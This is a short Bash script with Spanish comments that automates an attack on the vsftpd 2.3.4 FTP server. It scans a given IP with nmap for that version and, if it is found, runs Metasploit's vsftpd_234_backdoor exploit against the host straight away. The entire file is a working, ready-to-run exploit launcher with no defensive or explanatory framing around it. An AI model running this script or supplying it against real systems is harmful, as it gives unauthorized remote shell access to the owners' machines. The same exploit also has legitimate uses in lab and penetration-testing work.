#!/bin/bash

# Dirección IP del objetivo
TARGET_IP=$1

# Verificar si se ha proporcionado una IP
if [ -z "$TARGET_IP" ]; then
    echo "Uso: $0 <IP_objetivo>"
    exit 1
fi

# Escanear el servicio FTP para detectar VSFTPD 2.3.4
echo "Escaneando el servicio FTP en $TARGET_IP..."
nmap -sV -p 21 $TARGET_IP > nmap_results.txt

# Comprobar si VSFTPD 2.3.4 está presente
grep "vsftpd 2.3.4" nmap_results.txt

if [ $? -eq 0 ]; then
    echo "Servicio VSFTPD 2.3.4 detectado. Iniciando explotación..."
    # Ejecutar el exploit utilizando Metasploit
    msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOST $TARGET_IP; exploit; exit"
else
    echo "Servicio VSFTPD 2.3.4 no detectado. Abortando."
    exit 1
fi
